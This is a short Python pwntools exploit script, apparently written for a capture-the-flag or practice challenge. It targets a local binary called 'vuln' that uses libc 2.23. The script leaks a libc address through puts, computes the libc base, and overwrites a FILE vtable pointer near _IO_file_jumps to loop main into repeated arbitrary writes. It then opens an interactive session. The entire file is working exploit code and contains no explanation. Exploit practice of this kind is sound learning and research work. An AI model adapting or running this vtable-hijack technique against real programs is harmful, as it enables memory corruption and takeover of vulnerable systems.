from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level = 'debug'

libc = ELF('./libc-2.23.so')
elf = ELF('./vuln')

# puts+165
io = gdb.debug("./vuln", "b *(main+137)\nc")
# io = process('./vuln')
libc_base = int(io.recvline(),16) - libc.sym['puts']
print(f'{libc_base = :#x}')
libc.address = libc_base
# fake vtable, hijack it into infinite write loop
io.sendline(flat([0]*7+[elf.sym['main']+0x51]))
# io.sendline(flat([0]*7+[0xdeadbeef]))
io.sendline(str(libc_base + 0x3c56f8).encode())  # this points to _IO_file_jumps
io.sendline(str(elf.sym['inp']).encode())

# example writes
# for i in range(6):
#     io.sendline(str(elf.sym['inp']+i*8).encode())
#     io.sendline(str(0x87638763).encode())
io.interactive()
